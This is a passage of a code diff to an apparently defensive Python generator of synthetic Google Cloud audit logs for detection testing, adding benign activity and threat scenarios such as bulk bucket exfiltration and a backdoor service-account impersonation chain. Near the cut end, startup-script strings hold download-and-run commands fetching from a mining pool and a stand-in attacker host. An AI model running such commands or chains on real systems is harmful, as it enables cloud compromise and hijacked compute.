@@ -150,6 +150,72 @@ _CORP_GROUP_PREFIXES = [
     "data-scientists", "sre-oncall", "contractors",
 ]
 
+# ---------------------------------------------------------------------------
+# Proto @type mapping for request/response bodies
+# Maps (service_name_fragment, method_keyword) → (request_@type, response_@type)
+# None means "no @type for that body" (e.g. response on a read may be empty).
+# The function _inject_proto_type uses the first match it finds.
+# ---------------------------------------------------------------------------
+_PROTO_TYPE_MAP = [
+    # Compute
+    ("compute", "instances.insert",     "type.googleapis.com/compute.instances.insert", "type.googleapis.com/compute.Operation"),
+    ("compute", "instances.delete",     "type.googleapis.com/compute.instances.delete", "type.googleapis.com/compute.Operation"),
+    ("compute", "instances.stop",       "type.googleapis.com/compute.instances.stop",   "type.googleapis.com/compute.Operation"),
+    ("compute", "instances.start",      "type.googleapis.com/compute.instances.start",  "type.googleapis.com/compute.Operation"),
+    ("compute", "instances.list",       "type.googleapis.com/compute.instances.list",   None),
+    ("compute", "instances.get",        "type.googleapis.com/compute.instances.get",    None),
+    ("compute", "firewalls.",           "type.googleapis.com/compute.firewalls.insert", "type.googleapis.com/compute.Operation"),
+    # Storage
+    ("storage", "storage.objects.create", "type.googleapis.com/storage.objects.compose", None),
+    ("storage", "storage.objects.get",    "type.googleapis.com/storage.objects.get",     None),
+    ("storage", "storage.objects.list",   "type.googleapis.com/storage.objects.list",    None),
+    ("storage", "storage.buckets.get",    "type.googleapis.com/storage.buckets.get",     None),
+    ("storage", "storage.buckets.create", "type.googleapis.com/storage.buckets.create",  None),
+    # IAM
+    ("iam", "CreateServiceAccount",     "type.googleapis.com/google.iam.admin.v1.CreateServiceAccountRequest",  "type.googleapis.com/google.iam.admin.v1.ServiceAccount"),
+    ("iam", "CreateServiceAccountKey",  "type.googleapis.com/google.iam.admin.v1.CreateServiceAccountKeyRequest", "type.googleapis.com/google.iam.admin.v1.ServiceAccountKey"),
+    ("iam", "SetIamPolicy",            "type.googleapis.com/google.iam.v1.SetIamPolicyRequest",  "type.googleapis.com/google.iam.v1.Policy"),
+    ("iam", "GetIamPolicy",            "type.googleapis.com/google.iam.v1.GetIamPolicyRequest",  "type.googleapis.com/google.iam.v1.Policy"),
+    # Cloud Resource Manager
+    ("cloudresourcemanager", "SetIamPolicy",   "type.googleapis.com/google.iam.v1.SetIamPolicyRequest",  "type.googleapis.com/google.iam.v1.Policy"),
+    ("cloudresourcemanager", "GetIamPolicy",   "type.googleapis.com/google.iam.v1.GetIamPolicyRequest",  "type.googleapis.com/google.iam.v1.Policy"),
+    ("cloudresourcemanager", "DeleteProject",  "type.googleapis.com/google.cloud.resourcemanager.v3.DeleteProjectRequest", "type.googleapis.com/google.longrunning.Operation"),
+    # Logging
+    ("logging", "CreateSink",          "type.googleapis.com/google.logging.v2.CreateSinkRequest",  "type.googleapis.com/google.logging.v2.LogSink"),
+    ("logging", "UpdateSink",          "type.googleapis.com/google.logging.v2.UpdateSinkRequest",  "type.googleapis.com/google.logging.v2.LogSink"),
+    ("logging", "DeleteSink",          "type.googleapis.com/google.logging.v2.DeleteSinkRequest",  None),
+    # KMS
+    ("cloudkms", "Encrypt",            "type.googleapis.com/google.cloud.kms.v1.EncryptRequest",   "type.googleapis.com/google.cloud.kms.v1.EncryptResponse"),
+    ("cloudkms", "Decrypt",            "type.googleapis.com/google.cloud.kms.v1.DecryptRequest",   "type.googleapis.com/google.cloud.kms.v1.DecryptResponse"),
+    # Secret Manager
+    ("secretmanager", "AccessSecretVersion", "type.googleapis.com/google.cloud.secretmanager.v1.AccessSecretVersionRequest", None),
+    ("secretmanager", "ListSecrets",   "type.googleapis.com/google.cloud.secretmanager.v1.ListSecretsRequest", None),
+    # Cloud Functions
+    ("cloudfunctions", "CreateFunction", "type.googleapis.com/google.cloud.functions.v2.CreateFunctionRequest", "type.googleapis.com/google.longrunning.Operation"),
+    ("cloudfunctions", "UpdateFunction", "type.googleapis.com/google.cloud.functions.v2.UpdateFunctionRequest", "type.googleapis.com/google.longrunning.Operation"),
+    # BigQuery
+    ("bigquery", "datasetservice.insert", "type.googleapis.com/google.cloud.bigquery.v2.Dataset", None),
+    ("bigquery", "jobservice.insert",     "type.googleapis.com/google.cloud.bigquery.v2.Job",     None),
+    # Container / GKE
+    ("container", "CreateCluster",     "type.googleapis.com/google.container.v1.CreateClusterRequest", "type.googleapis.com/google.longrunning.Operation"),
+    # Vertex AI / AI Platform
+    ("aiplatform", "PredictRequest",   "type.googleapis.com/google.cloud.aiplatform.v1.PredictRequest",   "type.googleapis.com/google.cloud.aiplatform.v1.PredictResponse"),
+    ("aiplatform", "CreateCustomJob",  "type.googleapis.com/google.cloud.aiplatform.v1.CreateCustomJobRequest", "type.googleapis.com/google.cloud.aiplatform.v1.CustomJob"),
+    # Login
+    ("login", "loginservice",          "type.googleapis.com/cit_signin.LoginEvent", None),
+]
+
+
+def _inject_proto_type(method_name, service_name, request_body, response_body):
+    """Inject @type into request/response dicts if a proto mapping exists."""
+    for svc_frag, method_kw, req_type, resp_type in _PROTO_TYPE_MAP:
+        if svc_frag in service_name and method_kw.lower() in method_name.lower():
+            if request_body is not None and isinstance(request_body, dict) and "@type" not in request_body and req_type:
+                request_body["@type"] = req_type
+            if response_body is not None and isinstance(response_body, dict) and "@type" not in response_body and resp_type:
+                response_body["@type"] = resp_type
+            return  # first match wins
+
 
 # ---------------------------------------------------------------------------
 # Helper Functions
@@ -235,14 +301,16 @@ def _get_random_principal(config, context=None, force_service_account=False):
             }
 
     # Fall back to service accounts from gcp_config
+    # Service accounts originate from internal GCP infra ~65% of the time
     gcp_conf = config.get(CONFIG_KEY, {})
     sa_list = gcp_conf.get('service_accounts', [])
     if sa_list:
         sa_email = random.choice(sa_list)
+        sa_ip = _get_serverless_internal_ip() if random.random() < 0.65 else _random_external_ip()
         return {
             'email':              sa_email,
             'display_name':       sa_email,
-            'caller_ip':          _random_external_ip(),
+            'caller_ip':          sa_ip,
             'is_service_account': True,
         }
 
@@ -251,7 +319,7 @@ def _get_random_principal(config, context=None, force_service_account=False):
     return {
         'email':              f"default-sa@{project_id}.iam.gserviceaccount.com",
         'display_name':       'Default Service Account',
-        'caller_ip':          _random_external_ip(),
+        'caller_ip':          _get_serverless_internal_ip(),
         'is_service_account': True,
     }
 
@@ -535,6 +603,8 @@ def _build_log_entry(
     service_data=None,
     user_agent=None,
     operation_id=None,
+    operation_first=True,
+    operation_last=True,
     offset_seconds=0,
 ):
     """
@@ -578,11 +648,16 @@ def _build_log_entry(
             }
         ]
 
+    auth_info = {
+        "principalEmail": principal_email,
+    }
+    # Service accounts include principalSubject in real GCP logs
+    if principal_email.endswith(".iam.gserviceaccount.com"):
+        auth_info["principalSubject"] = f"serviceAccount:{principal_email}"
+
     proto_payload = {
         "@type": _AUDIT_LOG_TYPE,
-        "authenticationInfo": {
-            "principalEmail": principal_email,
-        },
+        "authenticationInfo": auth_info,
         "requestMetadata": {
             "callerIp":                caller_ip,
             "callerSuppliedUserAgent": user_agent or _random_user_agent(),
@@ -593,11 +668,17 @@ def _build_log_entry(
         "methodName":      method_name,
         "resourceName":    resource_name,
         "authorizationInfo": authorization_info,
-        "status": {} if status_code == _STATUS_CODE_OK else {
+    }
+
+    # status is omitted on success, present only on error (real GCP behavior)
+    if status_code != _STATUS_CODE_OK:
+        proto_payload["status"] = {
             "code":    status_code,
             "message": status_message or "Permission denied.",
-        },
-    }
+        }
+
+    # Inject @type proto annotations into request/response bodies
+    _inject_proto_type(method_name, service_name, request_body, response_body)
 
     if request_body is not None:
         proto_payload["request"] = request_body
@@ -607,6 +688,20 @@ def _build_log_entry(
 
     if service_data is not None:
         proto_payload["serviceData"] = service_data
+
+    # Build top-level labels from service/resource context (real GCP behavior)
+    top_labels = {}
+    if "compute" in service_name:
+        if resource_labels.get("instance_id"):
+            top_labels["compute.googleapis.com/resource_id"] = resource_labels["instance_id"]
+        if resource_labels.get("zone"):
+            top_labels["compute.googleapis.com/resource_name"] = resource_name.split("/")[-1] if resource_name else ""
+    elif "storage" in service_name:
+        if resource_labels.get("bucket_name"):
+            top_labels["storage.googleapis.com/bucket_name"] = resource_labels["bucket_name"]
+    elif "iam" in service_name:
+        if resource_labels.get("email_id"):
+            top_labels["iam.googleapis.com/service_account_id"] = resource_labels.get("unique_id", "")
 
     entry = {
         "insertId":        _random_insert_id(),
@@ -621,12 +716,15 @@ def _build_log_entry(
         "protoPayload": proto_payload,
     }
 
+    if top_labels:
+        entry["labels"] = top_labels
+
     if operation_id:
         entry["operation"] = {
             "id":       operation_id,
             "producer": service_name,
-            "first":    True,
-            "last":     True,
+            "first":    operation_first,
+            "last":     operation_last,
         }
 
     return entry
@@ -947,7 +1045,7 @@ def _gen_iam_get_policy(config, context=None):
         principal_email = p['email'],
         caller_ip       = p['caller_ip'],
         service_name    = "cloudresourcemanager.googleapis.com",
-        method_name     = "GetIamPolicy",
+        method_name     = "google.iam.v1.IAMPolicy.GetIamPolicy",
         resource_name   = f"projects/{project_id}",
         resource_type   = "project",
         resource_labels = {},
@@ -1466,6 +1564,315 @@ def _gen_compute_list_images(config, context=None):
     return [entry]
 
 
+def _gen_workspace_login_success(config, context=None):
+    """Benign: Successful Google Workspace login via login.googleapis.com.
+    Establishes user login baselines for XSIAM UEBA.
+    """
+    p = _get_random_principal(config, context)
+    project_id = _get_project_id(config)
+
+    entry = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "login.googleapis.com",
+        method_name     = "google.login.LoginService.loginSuccess",
+        resource_name   = f"organizations/{config.get(CONFIG_KEY, {}).get('organization_id', '123456789')}",
+        resource_type   = "audited_resource",
+        resource_labels = {"service": "login.googleapis.com", "project_id": project_id},
+        log_type        = _LOG_ACTIVITY,
+        request_body    = {
+            "login_type": random.choice(["google_password", "saml", "exchange"]),
+            "login_challenge_method": random.choice(["password", "idv_preregistered_phone", "none"]),
+        },
+    )
+    return [entry]
+
+
+def _gen_workspace_login_failure(config, context=None):
+    """Benign: Failed Google Workspace login — builds normal failure-rate baselines.
+
+    Diversified failure reasons: wrong password, expired MFA, suspended account,
+    SAML assertion failure, device compliance block.
+    """
+    p = _get_random_principal(config, context)
+    project_id = _get_project_id(config)
+
+    failure_variants = [
+        {
+            "login_type": "google_password",
+            "login_challenge_method": "password",
+            "status_message": "Login failed: incorrect password.",
+        },
+        {
+            "login_type": "google_password",
+            "login_challenge_method": "totp",
+            "status_message": "Login failed: invalid 2-Step Verification code.",
+        },
+        {
+            "login_type": "google_password",
+            "login_challenge_method": "security_key",
+            "status_message": "Login failed: security key verification timed out.",
+        },
+        {
+            "login_type": "saml",
+            "login_challenge_method": "saml",
+            "status_message": "Login failed: SAML assertion validation failed.",
+        },
+        {
+            "login_type": "google_password",
+            "login_challenge_method": "password",
+            "status_message": "Login failed: account suspended by admin.",
+        },
+        {
+            "login_type": "google_password",
+            "login_challenge_method": "device_compliance",
+            "status_message": "Login failed: device does not meet compliance policy.",
+        },
+    ]
+
+    variant = random.choice(failure_variants)
+
+    entry = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "login.googleapis.com",
+        method_name     = "google.login.LoginService.loginFailure",
+        resource_name   = f"organizations/{config.get(CONFIG_KEY, {}).get('organization_id', '123456789')}",
+        resource_type   = "audited_resource",
+        resource_labels = {"service": "login.googleapis.com", "project_id": project_id},
+        log_type        = _LOG_ACTIVITY,
+        status_code     = _STATUS_CODE_PERMISSION_DENIED,
+        status_message  = variant["status_message"],
+        request_body    = {
+            "login_type": variant["login_type"],
+            "login_challenge_method": variant["login_challenge_method"],
+        },
+    )
+    return [entry]
+
+
+def _gen_benign_permission_denied(config, context=None):
+    """Benign: Occasional PERMISSION_DENIED on normal reads — permission boundary noise.
+
+    Realistic failure noise so XSIAM UEBA doesn't over-flag transient permission errors.
+    Service accounts hitting cross-project resources, users with stale roles, etc.
+    """
+    p = _get_random_principal(config, context)
+    project_id = _get_project_id(config)
+    region = _random_region(config)
+
+    # Common read operations that naturally fail due to permissions
+    denied_ops = [
+        {
+            "service": "storage.googleapis.com",
+            "method": "storage.objects.get",
+            "resource": f"projects/_/buckets/{project_id}-private-data/objects/sensitive/report.csv",
+            "permission": "storage.objects.get",
+        },
+        {
+            "service": "compute.googleapis.com",
+            "method": "v1.compute.instances.list",
+            "resource": f"projects/{project_id}/zones/{_random_zone(region)}/instances",
+            "permission": "compute.instances.list",
+        },
+        {
+            "service": "bigquery.googleapis.com",
+            "method": "google.cloud.bigquery.v2.DatasetService.ListDatasets",
+            "resource": f"projects/{project_id}/datasets",
+            "permission": "bigquery.datasets.get",
+        },
+        {
+            "service": "secretmanager.googleapis.com",
+            "method": "google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion",
+            "resource": f"projects/{project_id}/secrets/prod-api-key/versions/latest",
+            "permission": "secretmanager.versions.access",
+        },
+        {
+            "service": "iam.googleapis.com",
+            "method": "google.iam.admin.v1.ListServiceAccounts",
+            "resource": f"projects/{project_id}/serviceAccounts",
+            "permission": "iam.serviceAccounts.list",
+        },
+        {
+            "service": "cloudkms.googleapis.com",
+            "method": "google.cloud.kms.v1.KeyManagementService.ListCryptoKeys",
+            "resource": f"projects/{project_id}/locations/{region}/keyRings/default/cryptoKeys",
+            "permission": "cloudkms.cryptoKeys.list",
+        },
+    ]
+
+    op = random.choice(denied_ops)
+    entry = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = op["service"],
+        method_name     = op["method"],
+        resource_name   = op["resource"],
+        resource_type   = "audited_resource",
+        resource_labels = {"project_id": project_id},
+        status_code     = _STATUS_CODE_PERMISSION_DENIED,
+        status_message  = f"Permission '{op['permission']}' denied on resource '{op['resource']}'.",
+        authorization_info = [{
+            "resource":   op["resource"],
+            "permission": op["permission"],
+            "granted":    False,
+            "resourceAttributes": {},
+        }],
+    )
+    return [entry]
+
+
+def _gen_dataproc_list_clusters(config, context=None):
+    """Benign: List Dataproc clusters — data-engineering teams querying cluster state."""
+    p = _get_random_principal(config, context)
+    project_id = _get_project_id(config)
+    region = _random_region(config)
+
+    entry = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "dataproc.googleapis.com",
+        method_name     = "google.cloud.dataproc.v1.ClusterController.ListClusters",
+        resource_name   = f"projects/{project_id}/regions/{region}/clusters",
+        resource_type   = "cloud_dataproc_cluster",
+        resource_labels = {"project_id": project_id, "region": region},
+        request_body    = {"projectId": project_id, "region": region, "pageSize": 100},
+    )
+    return [entry]
+
+
+def _gen_dataproc_submit_job(config, context=None):
+    """Benign: Submit a Dataproc Spark/Hive job — routine data pipeline execution."""
+    p = _get_random_principal(config, context)
+    project_id = _get_project_id(config)
+    region = _random_region(config)
+    cluster_name = random.choice(["analytics-cluster", "etl-cluster", "ml-pipeline-cluster", "prod-spark-01"])
+    job_id = uuid.uuid4().hex[:16]
+
+    job_types = [
+        {"sparkJob": {"mainJarFileUri": f"gs://{project_id}-jobs/etl-{random.randint(1,20)}.jar", "args": ["--date", "2026-04-15"]}},
+        {"hiveJob": {"queryFileUri": f"gs://{project_id}-jobs/queries/daily_agg.sql", "continueOnFailure": False}},
+        {"pysparkJob": {"mainPythonFileUri": f"gs://{project_id}-jobs/transforms/main.py", "args": ["--mode", "batch"]}},
+    ]
+
+    entry = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "dataproc.googleapis.com",
+        method_name     = "google.cloud.dataproc.v1.JobController.SubmitJob",
+        resource_name   = f"projects/{project_id}/regions/{region}/clusters/{cluster_name}",
+        resource_type   = "cloud_dataproc_cluster",
+        resource_labels = {"project_id": project_id, "region": region, "cluster_name": cluster_name},
+        log_type        = _LOG_ACTIVITY,
+        request_body    = {
+            "projectId": project_id,
+            "region":    region,
+            "job": {
+                "placement": {"clusterName": cluster_name},
+                "reference": {"jobId": job_id},
+                **random.choice(job_types),
+            },
+        },
+        response_body   = {"reference": {"jobId": job_id}, "status": {"state": "PENDING"}},
+    )
+    return [entry]
+
+
+def _gen_cloud_scheduler_list_jobs(config, context=None):
+    """Benign: List Cloud Scheduler jobs — ops dashboards and CI polling."""
+    p = _get_random_principal(config, context)
+    project_id = _get_project_id(config)
+    region = _random_region(config)
+
+    entry = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "cloudscheduler.googleapis.com",
+        method_name     = "google.cloud.scheduler.v1.CloudScheduler.ListJobs",
+        resource_name   = f"projects/{project_id}/locations/{region}",
+        resource_type   = "cloud_scheduler_job",
+        resource_labels = {"project_id": project_id, "location": region},
+        request_body    = {"parent": f"projects/{project_id}/locations/{region}", "pageSize": 50},
+    )
+    return [entry]
+
+
+def _gen_cloud_tasks_list_queues(config, context=None):
+    """Benign: List Cloud Tasks queues — application service discovery."""
+    p = _get_random_principal(config, context)
+    project_id = _get_project_id(config)
+    region = _random_region(config)
+
+    entry = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "cloudtasks.googleapis.com",
+        method_name     = "google.cloud.tasks.v2.CloudTasks.ListQueues",
+        resource_name   = f"projects/{project_id}/locations/{region}",
+        resource_type   = "cloud_tasks_queue",
+        resource_labels = {"project_id": project_id, "location": region},
+        request_body    = {"parent": f"projects/{project_id}/locations/{region}", "pageSize": 100},
+    )
+    return [entry]
+
+
+def _gen_firestore_list_documents(config, context=None):
+    """Benign: List Firestore documents — app backend reads."""
+    p = _get_random_principal(config, context)
+    project_id = _get_project_id(config)
+    collections = ["users", "orders", "sessions", "products", "configs", "events"]
+    collection = random.choice(collections)
+
+    entry = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "firestore.googleapis.com",
+        method_name     = "google.firestore.v1.Firestore.ListDocuments",
+        resource_name   = f"projects/{project_id}/databases/(default)/documents/{collection}",
+        resource_type   = "firestore_database",
+        resource_labels = {"project_id": project_id, "database_id": "(default)"},
+        request_body    = {
+            "parent":     f"projects/{project_id}/databases/(default)/documents",
+            "collectionId": collection,
+            "pageSize":   random.choice([20, 50, 100]),
+        },
+    )
+    return [entry]
+
+
+def _gen_firestore_write(config, context=None):
+    """Benign: Write a Firestore document — routine app backend writes."""
+    p = _get_random_principal(config, context)
+    project_id = _get_project_id(config)
+    collections = ["users", "orders", "sessions", "analytics", "configs"]
+    collection = random.choice(collections)
+    doc_id = uuid.uuid4().hex[:12]
+
+    entry = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "firestore.googleapis.com",
+        method_name     = "google.firestore.v1.Firestore.Commit",
+        resource_name   = f"projects/{project_id}/databases/(default)/documents/{collection}/{doc_id}",
+        resource_type   = "firestore_database",
+        resource_labels = {"project_id": project_id, "database_id": "(default)"},
+        log_type        = _LOG_ACTIVITY,
+        request_body    = {
+            "writes": [{"update": {"name": f"projects/{project_id}/databases/(default)/documents/{collection}/{doc_id}"}}],
+        },
+    )
+    return [entry]
+
+
 # ---------------------------------------------------------------------------
 # Threat / Suspicious Event Generators
 # ---------------------------------------------------------------------------
@@ -1676,7 +2083,7 @@ def _gen_iam_privilege_escalation(config, context=None):
         principal_email = p['email'],
         caller_ip       = p['caller_ip'],
         service_name    = "cloudresourcemanager.googleapis.com",
-        method_name     = "SetIamPolicy",
+        method_name     = "google.iam.v1.IAMPolicy.SetIamPolicy",
         resource_name   = f"projects/{project_id}",
         resource_type   = "project",
         resource_labels = {},
@@ -1771,6 +2178,7 @@ def _gen_firewall_expose_all(config, context=None):
     network = _get_random_vpc_network(config)
     rule_name = f"allow-all-ingress-{''.join(random.choices('abcdef0123456789', k=6))}"
     firewall_rule_id = str(random.randint(100000000000000000, 999999999999999999))
+    op_id = f"operation-{uuid.uuid4().hex[:12]}-{uuid.uuid4().hex[:8]}"
 
     entry = _build_log_entry(
         project_id      = project_id,
@@ -1782,6 +2190,8 @@ def _gen_firewall_expose_all(config, context=None):
         resource_type   = "gce_firewall_rule",
         resource_labels = {"firewall_rule_id": firewall_rule_id},
         log_type        = _LOG_ACTIVITY,
+        operation_id    = op_id,
+        operation_last  = False,
         request_body    = {
             "project": project_id,
             "firewall": {
@@ -1810,6 +2220,7 @@ def _gen_disable_vpc_flow_logs(config, context=None):
     project_id = _get_project_id(config)
     region = _random_region(config)
     subnet_name = random.choice(["default", "prod-subnet", "app-subnet", "internal-subnet"])
+    op_id = f"operation-{uuid.uuid4().hex[:12]}-{uuid.uuid4().hex[:8]}"
 
     entry = _build_log_entry(
         project_id      = project_id,
@@ -1821,6 +2232,8 @@ def _gen_disable_vpc_flow_logs(config, context=None):
         resource_type   = "gce_subnetwork",
         resource_labels = {"subnetwork_name": subnet_name, "location": region, "subnetwork_id": str(random.randint(1000000000, 9999999999))},
         log_type        = _LOG_ACTIVITY,
+        operation_id    = op_id,
+        operation_last  = False,
         request_body    = {
             "project":    project_id,
             "region":     region,
@@ -1921,6 +2334,7 @@ def _gen_snapshot_exfil(config, context=None):
         resource_labels = {"zone": zone, "disk_id": str(random.randint(1000000000000000, 9999999999999999))},
         log_type        = _LOG_ACTIVITY,
         operation_id    = op_id,
+        operation_last  = False,
         request_body    = {
             "project":  project_id,
             "zone":     zone,
@@ -1933,10 +2347,6 @@ def _gen_snapshot_exfil(config, context=None):
         },
         offset_seconds  = -5,
     )
-    # createSnapshot is an LRO — the audit event marks the request (first=True, last=False),
-    # not the completion. The LRO completes asynchronously; no separate completion audit event
-    # is generated in Cloud Audit Logs for Compute Engine disk operations.
-    entry_create["operation"]["last"] = False
 
     entry_share = _build_log_entry(
         project_id      = project_id,
@@ -2203,7 +2613,7 @@ def _gen_cross_project_sa_grant(config, context=None):
         principal_email = p['email'],
         caller_ip       = p['caller_ip'],
         service_name    = "cloudresourcemanager.googleapis.com",
-        method_name     = "SetIamPolicy",
+        method_name     = "google.iam.v1.IAMPolicy.SetIamPolicy",
         resource_name   = f"projects/{project_id}",
         resource_type   = "project",
         resource_labels = {},
@@ -2276,6 +2686,75 @@ def _gen_kms_key_destroy(config, context=None):
         },
     )
     return [entry]
+
+
+def _gen_gcs_bulk_download_exfil(config, context=None):
+    """
+    THREAT: GCS bulk-download exfiltration chain.
+    Enumerates buckets, lists objects, then rapidly downloads many objects.
+    service: storage.googleapis.com
+    """
+    p = _get_random_principal(config, context)
+    project_id = _get_project_id(config)
+    bucket = _get_random_gcs_bucket(config)
+    region = _random_region(config)
+    events = []
+
+    # Step 1: List buckets
+    e1 = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "storage.googleapis.com",
+        method_name     = "storage.buckets.list",
+        resource_name   = f"projects/_/buckets",
+        resource_type   = "gcs_bucket",
+        resource_labels = {"bucket_name": "", "location": region},
+        log_type        = _LOG_DATA_ACCESS,
+        offset_seconds  = -30,
+    )
+    events.append(e1)
+
+    # Step 2: List objects in target bucket
+    e2 = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "storage.googleapis.com",
+        method_name     = "storage.objects.list",
+        resource_name   = f"projects/_/buckets/{bucket}",
+        resource_type   = "gcs_bucket",
+        resource_labels = {"bucket_name": bucket, "location": region},
+        log_type        = _LOG_DATA_ACCESS,
+        offset_seconds  = -25,
+        request_body    = {"bucket": bucket, "maxResults": "1000"},
+    )
+    events.append(e2)
+
+    # Steps 3-N: Rapid object downloads (8-20 files)
+    download_count = random.randint(8, 20)
+    file_prefixes = ['data/', 'exports/', 'backups/', 'secrets/', 'credentials/']
+    file_names = ['customers.csv', 'financial-report.xlsx', 'api-keys.json',
+                  'db-dump.sql', 'pii-records.parquet', 'audit-log.jsonl',
+                  'employee-data.csv', 'billing-export.csv', 'access-tokens.json',
+                  'ssl-certs.tar.gz']
+    for i in range(download_count):
+        obj_name = f"{random.choice(file_prefixes)}{random.choice(file_names)}"
+        e = _build_log_entry(
+            project_id      = project_id,
+            principal_email = p['email'],
+            caller_ip       = p['caller_ip'],
+            service_name    = "storage.googleapis.com",
+            method_name     = "storage.objects.get",
+            resource_name   = f"projects/_/buckets/{bucket}/objects/{obj_name}",
+            resource_type   = "gcs_bucket",
+            resource_labels = {"bucket_name": bucket, "location": region},
+            log_type        = _LOG_DATA_ACCESS,
+            offset_seconds  = -(20 - i),
+        )
+        events.append(e)
+
+    return events
 
 
 def _gen_bigquery_data_exfil(config, context=None):
@@ -2352,7 +2831,7 @@ def _gen_project_delete(config, context=None):
         principal_email = p['email'],
         caller_ip       = p['caller_ip'],
         service_name    = "cloudresourcemanager.googleapis.com",
-        method_name     = "DeleteProject",
+        method_name     = "google.cloudresourcemanager.v3.Projects.DeleteProject",
         resource_name   = f"projects/{project_id}",
         resource_type   = "project",
         resource_labels = {},
@@ -2380,7 +2859,7 @@ def _gen_external_user_added(config, context=None):
         principal_email = p['email'],
         caller_ip       = p['caller_ip'],
         service_name    = "cloudresourcemanager.googleapis.com",
-        method_name     = "SetIamPolicy",
+        method_name     = "google.iam.v1.IAMPolicy.SetIamPolicy",
         resource_name   = f"projects/{project_id}",
         resource_type   = "project",
         resource_labels = {},
@@ -2593,6 +3072,184 @@ def _gen_compute_image_exfil(config, context=None):
     return [e1, e2]
 
 
+def _gen_sa_create_key_impersonate_chain(config, context=None):
+    """
+    THREAT: Multi-step SA privilege escalation chain:
+      1. CreateServiceAccount
+      2. CreateServiceAccountKey
+      3. GenerateAccessToken (impersonation)
+    Simulates an attacker creating a backdoor SA, exfiltrating its key,
+    then using it to impersonate the SA for lateral movement.
+    """
+    p = _get_random_principal(config, context)
+    project_id = _get_project_id(config)
+    account_id = f"backdoor-{uuid.uuid4().hex[:8]}"
+    sa_email = f"{account_id}@{project_id}.iam.gserviceaccount.com"
+    unique_id = str(random.randint(100000000000000000000, 999999999999999999999))
+    key_id = ''.join(random.choices('abcdef0123456789', k=40))
+
+    # Step 1: Create the SA
+    e1 = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "iam.googleapis.com",
+        method_name     = "google.iam.admin.v1.CreateServiceAccount",
+        resource_name   = f"projects/{project_id}/serviceAccounts/{sa_email}",
+        resource_type   = "service_account",
+        resource_labels = {"email_id": sa_email, "unique_id": unique_id},
+        log_type        = _LOG_ACTIVITY,
+        offset_seconds  = -20,
+        request_body    = {
+            "name": f"projects/{project_id}",
+            "accountId": account_id,
+            "serviceAccount": {"displayName": f"Temp SA {account_id}"},
+        },
+        response_body = {
+            "email": sa_email,
+            "uniqueId": unique_id,
+            "displayName": f"Temp SA {account_id}",
+        },
+    )
+
+    # Step 2: Create key for the SA
+    e2 = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "iam.googleapis.com",
+        method_name     = "google.iam.admin.v1.CreateServiceAccountKey",
+        resource_name   = f"projects/{project_id}/serviceAccounts/{sa_email}/keys/{key_id}",
+        resource_type   = "service_account",
+        resource_labels = {"email_id": sa_email, "unique_id": unique_id},
+        log_type        = _LOG_ACTIVITY,
+        offset_seconds  = -12,
+        request_body    = {
+            "name": f"projects/{project_id}/serviceAccounts/{sa_email}",
+            "privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
+            "keyAlgorithm": "KEY_ALG_RSA_2048",
+        },
+        response_body = {
+            "name": f"projects/{project_id}/serviceAccounts/{sa_email}/keys/{key_id}",
+            "keyAlgorithm": "KEY_ALG_RSA_2048",
+            "validAfterTime": _gcp_timestamp(),
+        },
+    )
+
+    # Step 3: Use key to impersonate SA (GenerateAccessToken)
+    e3 = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "iamcredentials.googleapis.com",
+        method_name     = "google.iam.credentials.v1.IAMCredentials.GenerateAccessToken",
+        resource_name   = f"projects/-/serviceAccounts/{sa_email}",
+        resource_type   = "service_account",
+        resource_labels = {"email_id": sa_email, "unique_id": unique_id},
+        log_type        = _LOG_DATA_ACCESS,
+        request_body    = {
+            "name": f"projects/-/serviceAccounts/{sa_email}",
+            "scope": ["https://www.googleapis.com/auth/cloud-platform"],
+            "lifetime": "3600s",
+        },
+    )
+
+    return [e1, e2, e3]
+
+
+def _gen_compute_instance_insert(config, context=None):
+    """
+    THREAT: Create a suspicious compute instance — cryptomining or attack staging.
+    Uses high-CPU machine type and suspicious metadata startup script.
+    service: compute.googleapis.com  method: v1.compute.instances.insert
+    resource_type: gce_instance  log_type: ACTIVITY
+    """
+    p = _get_random_principal(config, context)
+    project_id = _get_project_id(config)
+    region = _random_region(config)
+    zone = _random_zone(region)
+
+    instance_name = random.choice([
+        f"worker-{uuid.uuid4().hex[:8]}",
+        f"miner-node-{random.randint(1,99)}",
+        f"temp-instance-{uuid.uuid4().hex[:6]}",
+    ])
+    machine_types = ['n1-highcpu-96', 'n2d-highcpu-128', 'c2-standard-60', 'a2-highgpu-1g']
+    machine_type = random.choice(machine_types)
+    instance_id = str(random.randint(1000000000000000, 9999999999999999))
+    op_id = f"operation-{uuid.uuid4().hex[:12]}-{uuid.uuid4().hex[:8]}"
+
+    startup_scripts = [
+        "#!/bin/bash\\ncurl -s http://pool.minexmr.com/setup.sh | bash",
+        "#!/bin/bash\\nwget -q http://attacker.xyz/payload && chmod +x payload && ./payload",
